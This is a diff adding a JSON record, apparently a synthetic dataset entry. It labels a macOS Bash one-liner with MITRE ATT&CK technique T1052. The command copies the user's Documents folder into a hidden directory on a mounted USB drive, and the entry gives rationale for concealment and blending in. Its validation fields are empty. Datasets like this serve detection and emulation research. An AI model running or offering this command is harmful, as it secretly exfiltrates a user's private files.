@@ -1,0 +1,23 @@
+{
+  "technique_id": "T1052",
+  "platform": "macOS",
+  "shell": "Bash",
+  "command": "mkdir -p \"/Volumes/UNTITLED/.logs\" && cp -Rp \"$HOME/Documents\" \"/Volumes/UNTITLED/.logs/\"",
+  "explanation": "Copies the user's Documents directory to a hidden folder on a mounted USB drive to exfiltrate data via removable media.",
+  "rationale_steps": [
+    "Assume an external drive is mounted at /Volumes/UNTITLED.",
+    "Create a hidden destination directory on the USB to reduce casual discovery.",
+    "Recursively copy data while preserving timestamps and permissions to blend in.",
+    "Operate fully offline, avoiding any network transmission."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1052-06d48d2a-36d8736b",
+  "source_prompt_hash": "06d48d2a",
+  "timestamp_utc": "2025-09-30T05:16:28.232349Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
